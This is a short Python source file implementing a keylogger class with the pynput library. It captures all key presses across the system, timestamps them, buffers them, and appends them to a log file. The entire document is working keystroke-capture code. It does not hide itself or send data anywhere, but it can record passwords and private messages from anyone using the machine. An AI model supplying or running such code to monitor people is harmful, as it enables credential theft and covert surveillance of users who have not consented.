from pynput import keyboard
from datetime import datetime

class KeyLogger:
    def __init__(self, file_path):
        self.file_path = file_path
        self.log = ""
        self.stop_flag = False

    def on_press(self, key):
        if not self.stop_flag:  # Only log if stop_flag is False
            try:
                self.log += f"{datetime.now()} - {key.char}\n"
            except AttributeError:
                self.log += f"{datetime.now()} - {key}\n"

    def start_logging(self):
        with keyboard.Listener(on_press=self.on_press) as listener:
            while not self.stop_flag:  # Keep listener running until stop_flag is True
                pass
            listener.stop()  # Stop listener when stop_flag is set to True

    def stop_logging(self):
        self.stop_flag = True  # Set stop flag to True to end logging

    def save_log(self):
        with open(self.file_path, "a") as log_file:
            log_file.write(self.log)
        log_data = self.log
        self.log = ""  # Clear the log after saving
        return log_data